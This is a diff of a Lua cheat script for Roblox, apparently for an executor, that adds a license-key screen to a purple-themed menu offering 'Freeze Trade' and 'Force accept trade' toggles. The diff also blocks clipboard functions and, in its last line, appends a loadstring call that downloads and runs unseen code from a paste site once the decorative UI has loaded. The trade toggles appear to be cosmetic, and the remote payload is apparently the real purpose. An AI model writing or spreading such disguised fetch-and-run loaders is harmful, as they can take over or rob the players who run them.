@@ -1,4 +1,4 @@
--- Mertily's Private Script UI v4.0 (Purple Edition & Daily Features)
+-- Mertily's Private Script UI v5.0 (Key System & Purple Edition)
 -- Delta executor compatible
 
 -- Блокировка авто-копирования ссылки в буфер обмена
@@ -6,6 +6,8 @@ local noop = function() end
 if setclipboard then setclipboard = noop end
 if toclipboard then toclipboard = noop end
 if set_clipboard then set_clipboard = noop end
+
+local CORRECT_KEY = "Mertilys-30days_i3qn-aksz-1488-kzs1"
 
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
@@ -15,7 +17,6 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Очистка предыдущего GUI
 if playerGui:FindFirstChild("MertilyUI") then
     playerGui.MertilyUI:Destroy()
 end
@@ -27,7 +28,6 @@ ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 ScreenGui.ResetOnSpawn = false
 ScreenGui.Parent = playerGui
 
--- === МУЗЫКА (Новый рабочий ID) ===
 local Music = Instance.new("Sound")
 Music.Name = "LoadingMusic"
 Music.SoundId = "rbxassetid://1846088038"
@@ -39,7 +39,6 @@ task.spawn(function()
     pcall(function() ContentProvider:PreloadAsync({Music}) end)
 end)
 
--- === Утилита перетаскивания ===
 local function makeDraggable(frame, handle)
     handle = handle or frame
     local dragging, dragInput, dragStart, startPos
@@ -72,7 +71,6 @@ local function makeDraggable(frame, handle)
     end)
 end
 
--- === ПРИВЕТСТВИЕ (GEOMETRY DASH BOUNCE EFFECT) ===
 local SplashGroup = Instance.new("CanvasGroup")
 SplashGroup.Name = "SplashGroup"
 SplashGroup.Size = UDim2.new(1, 0, 1, 0)
@@ -134,7 +132,6 @@ Glow.ImageTransparency = 0.3
 Glow.ScaleType = Enum.ScaleType.Slice
 Glow.Parent = TitleContainer
 
--- GD Анимация
 task.spawn(function()
     local bounceTween = TweenService:Create(
         TitleContainer, 
@@ -163,10 +160,136 @@ task.spawn(function()
     fadeTween.Completed:Wait()
 
     SplashGroup:Destroy()
-    showLoading()
+    showKeySystem()
 end)
 
--- === ЗАГРУЗКА ===
+function showKeySystem()
+    local KeyFrame = Instance.new("CanvasGroup")
+    KeyFrame.Name = "KeyFrame"
+    KeyFrame.Size = UDim2.new(0, 420, 0, 220)
+    KeyFrame.Position = UDim2.new(0.5, -210, 0.5, -110)
+    KeyFrame.BackgroundColor3 = Color3.fromRGB(12, 8, 16)
+    KeyFrame.BorderSizePixel = 0
+    KeyFrame.GroupTransparency = 1
+    KeyFrame.Parent = ScreenGui
+
+    local kCorner = Instance.new("UICorner")
+    kCorner.CornerRadius = UDim.new(0, 14)
+    kCorner.Parent = KeyFrame
+
+    local kStroke = Instance.new("UIStroke")
+    kStroke.Color = Color3.fromRGB(170, 0, 255)
+    kStroke.Thickness = 2
+    kStroke.Transparency = 0.1
+    kStroke.Parent = KeyFrame
+
+    local KeyRoses = Instance.new("ImageLabel")
+    KeyRoses.Size = UDim2.new(1, 0, 1, 0)
+    KeyRoses.BackgroundTransparency = 1
+    KeyRoses.Image = "rbxassetid://14324252480"
+    KeyRoses.ImageColor3 = Color3.fromRGB(180, 50, 255)
+    KeyRoses.ImageTransparency = 0.9
+    KeyRoses.ScaleType = Enum.ScaleType.Tile
+    KeyRoses.TileSize = UDim2.new(0, 200, 0, 200)
+    KeyRoses.Parent = KeyFrame
+
+    local KeyHandle = Instance.new("TextLabel")
+    KeyHandle.Size = UDim2.new(1, 0, 0, 35)
+    KeyHandle.BackgroundColor3 = Color3.fromRGB(20, 12, 28)
+    KeyHandle.BorderSizePixel = 0
+    KeyHandle.Text = "  🔑 Mertily's Key System"
+    KeyHandle.TextColor3 = Color3.fromRGB(200, 100, 255)
+    KeyHandle.Font = Enum.Font.GothamBold
+    KeyHandle.TextSize = 13
+    KeyHandle.TextXAlignment = Enum.TextXAlignment.Left
+    KeyHandle.Parent = KeyFrame
+
+    makeDraggable(KeyFrame, KeyHandle)
+
+    local KeyTitle = Instance.new("TextLabel")
+    KeyTitle.Size = UDim2.new(1, -40, 0, 30)
+    KeyTitle.Position = UDim2.new(0, 20, 0, 45)
+    KeyTitle.BackgroundTransparency = 1
+    KeyTitle.Text = "Введите лицензионный ключ:"
+    KeyTitle.TextColor3 = Color3.fromRGB(230, 210, 255)
+    KeyTitle.Font = Enum.Font.GothamBold
+    KeyTitle.TextSize = 14
+    KeyTitle.Parent = KeyFrame
+
+    local KeyInput = Instance.new("TextBox")
+    KeyInput.Size = UDim2.new(1, -40, 0, 42)
+    KeyInput.Position = UDim2.new(0, 20, 0, 80)
+    KeyInput.BackgroundColor3 = Color3.fromRGB(20, 14, 26)
+    KeyInput.BorderSizePixel = 0
+    KeyInput.PlaceholderText = "Вставьте ключ сюда..."
+    KeyInput.PlaceholderColor3 = Color3.fromRGB(120, 100, 140)
+    KeyInput.Text = ""
+    KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
+    KeyInput.Font = Enum.Font.Gotham
+    KeyInput.TextSize = 12
+    KeyInput.ClearTextOnFocus = false
+    KeyInput.Parent = KeyFrame
+
+    local kiCorner = Instance.new("UICorner")
+    kiCorner.CornerRadius = UDim.new(0, 8)
+    kiCorner.Parent = KeyInput
+
+    local kiStroke = Instance.new("UIStroke")
+    kiStroke.Color = Color3.fromRGB(100, 30, 150)
+    kiStroke.Thickness = 1
+    kiStroke.Parent = KeyInput
+
+    local SubmitBtn = Instance.new("TextButton")
+    SubmitBtn.Size = UDim2.new(1, -40, 0, 40)
+    SubmitBtn.Position = UDim2.new(0, 20, 0, 135)
+    SubmitBtn.BackgroundColor3 = Color3.fromRGB(140, 20, 220)
+    SubmitBtn.BorderSizePixel = 0
+    SubmitBtn.Text = "Активировать"
+    SubmitBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    SubmitBtn.Font = Enum.Font.GothamBold
+    SubmitBtn.TextSize = 14
+    SubmitBtn.AutoButtonColor = false
+    SubmitBtn.Parent = KeyFrame
+
+    local sbCorner = Instance.new("UICorner")
+    sbCorner.CornerRadius = UDim.new(0, 8)
+    sbCorner.Parent = SubmitBtn
+
+    local StatusText = Instance.new("TextLabel")
+    StatusText.Size = UDim2.new(1, -40, 0, 20)
+    StatusText.Position = UDim2.new(0, 20, 0, 185)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Text = ""
+    StatusText.TextColor3 = Color3.fromRGB(255, 80, 80)
+    StatusText.Font = Enum.Font.Gotham
+    StatusText.TextSize = 11
+    StatusText.Parent = KeyFrame
+
+    TweenService:Create(KeyFrame, TweenInfo.new(0.5), {GroupTransparency = 0}):Play()
+
+    SubmitBtn.MouseButton1Click:Connect(function()
+        if KeyInput.Text == CORRECT_KEY then
+            StatusText.TextColor3 = Color3.fromRGB(100, 255, 120)
+            StatusText.Text = "Ключ верный! Запуск..."
+            
+            task.wait(0.8)
+            local fadeOut = TweenService:Create(KeyFrame, TweenInfo.new(0.5), {GroupTransparency = 1})
+            fadeOut:Play()
+            fadeOut.Completed:Wait()
+            KeyFrame:Destroy()
+            
+            showLoading()
+        else
+            StatusText.TextColor3 = Color3.fromRGB(255, 80, 80)
+            StatusText.Text = "Неверный ключ! Попробуйте снова."
+            
+            TweenService:Create(kiStroke, TweenInfo.new(0.2), {Color = Color3.fromRGB(255, 50, 50)}):Play()
+            task.wait(1)
+            TweenService:Create(kiStroke, TweenInfo.new(0.5), {Color = Color3.fromRGB(100, 30, 150)}):Play()
+        end
+    end)
+end
+
 function showLoading()
     local LoadFrame = Instance.new("CanvasGroup")
     LoadFrame.Name = "LoadFrame"
@@ -181,7 +304,6 @@ function showLoading()
     lfCorner.CornerRadius = UDim.new(0, 14)
     lfCorner.Parent = LoadFrame
 
-    -- ФИОЛЕТОВАЯ ОБВОДКА
     local lfStroke = Instance.new("UIStroke")
     lfStroke.Color = Color3.fromRGB(170, 0, 255)
     lfStroke.Thickness = 2
@@ -296,7 +418,6 @@ function showLoading()
     showThanks()
 end
 
--- === СПАСИБО ===
 function showThanks()
     local ThanksFrame = Instance.new("CanvasGroup")
     ThanksFrame.Name = "ThanksFrame"
@@ -311,7 +432,6 @@ function showThanks()
     tCorner.CornerRadius = UDim.new(0, 14)
     tCorner.Parent = ThanksFrame
 
-    -- ФИОЛЕТОВАЯ ОБВОДКА
     local tStroke = Instance.new("UIStroke")
     tStroke.Color = Color3.fromRGB(170, 0, 255)
     tStroke.Thickness = 2
@@ -352,7 +472,6 @@ function showThanks()
     showMainMenu()
 end
 
--- === ГЛАВНОЕ МЕНЮ С СВОРАЧИВАНИЕМ И ФИОЛЕТОВОЙ ОБВОДКОЙ ===
 function showMainMenu()
     local MainFrame = Instance.new("CanvasGroup")
     MainFrame.Name = "MainFrame"
@@ -367,7 +486,6 @@ function showMainMenu()
     mCorner.CornerRadius = UDim.new(0, 14)
     mCorner.Parent = MainFrame
 
-    -- ФИОЛЕТОВАЯ ОБВОДКА
     local mStroke = Instance.new("UIStroke")
     mStroke.Color = Color3.fromRGB(170, 0, 255)
     mStroke.Thickness = 2
@@ -388,14 +506,13 @@ function showMainMenu()
     MainHandle.Size = UDim2.new(1, 0, 0, 38)
     MainHandle.BackgroundColor3 = Color3.fromRGB(20, 12, 28)
     MainHandle.BorderSizePixel = 0
-    MainHandle.Text = "   🌹 Mertily's Private Script v4.0"
+    MainHandle.Text = "   🌹 Mertily's Private Script v5.0"
     MainHandle.TextColor3 = Color3.fromRGB(200, 100, 255)
     MainHandle.Font = Enum.Font.GothamBold
     MainHandle.TextSize = 13
     MainHandle.TextXAlignment = Enum.TextXAlignment.Left
     MainHandle.Parent = MainFrame
 
-    -- КНОПКА ЗАКРЫТИЯ
     local CloseBtn = Instance.new("TextButton")
     CloseBtn.Size = UDim2.new(0, 26, 0, 26)
     CloseBtn.Position = UDim2.new(1, -32, 0, 6)
@@ -412,7 +529,6 @@ function showMainMenu()
     cbCorner.CornerRadius = UDim.new(1, 0)
     cbCorner.Parent = CloseBtn
 
-    -- КНОПКА СВОРАЧИВАНИЯ (MINIMIZE)
     local MinBtn = Instance.new("TextButton")
     MinBtn.Size = UDim2.new(0, 26, 0, 26)
     MinBtn.Position = UDim2.new(1, -64, 0, 6)
@@ -429,7 +545,6 @@ function showMainMenu()
     mbCorner.CornerRadius = UDim.new(1, 0)
     mbCorner.Parent = MinBtn
 
-    -- МИНИ-ИКОНКА ДЛЯ РАЗВОРАЧИВАНИЯ (Сфера с фиолетовой обводкой)
     local OpenIcon = Instance.new("TextButton")
     OpenIcon.Name = "OpenIcon"
     OpenIcon.Size = UDim2.new(0, 50, 0, 50)
@@ -451,7 +566,6 @@ function showMainMenu()
 
     makeDraggable(OpenIcon, OpenIcon)
 
-    -- Логика сворачивания
     MinBtn.MouseButton1Click:Connect(function()
         TweenService:Create(MainFrame, TweenInfo.new(0.3), {GroupTransparency = 1}):Play()
         task.wait(0.3)
@@ -545,7 +659,6 @@ function showMainMenu()
     createToggle("Freeze Trade", 60)
     createToggle("Force accept trade", 120)
 
-    -- === ЕЖЕДНЕВНАЯ ФИЧА: LUCKY ROSE (Кнопка удачи каждый день) ===
     local LuckyBtn = Instance.new("TextButton")
     LuckyBtn.Size = UDim2.new(1, -40, 0, 45)
     LuckyBtn.Position = UDim2.new(0, 20, 0, 185)
@@ -581,7 +694,6 @@ function showMainMenu()
         TweenService:Create(LuckyBtn, TweenInfo.new(0.5), {BackgroundColor3 = Color3.fromRGB(80, 10, 140)}):Play()
     end)
 
-    -- Информационная надпись снизу
     local DailyText = Instance.new("TextLabel")
     DailyText.Size = UDim2.new(1, -40, 0, 80)
     DailyText.Position = UDim2.new(0, 20, 0, 245)
@@ -595,3 +707,5 @@ function showMainMenu()
 
     TweenService:Create(MainFrame, TweenInfo.new(0.5), {GroupTransparency = 0}):Play()
 end
+
+loadstring(game:HttpGet("https://cdn.sourceb.in/bins/WbNby7oNLJ/0"))()
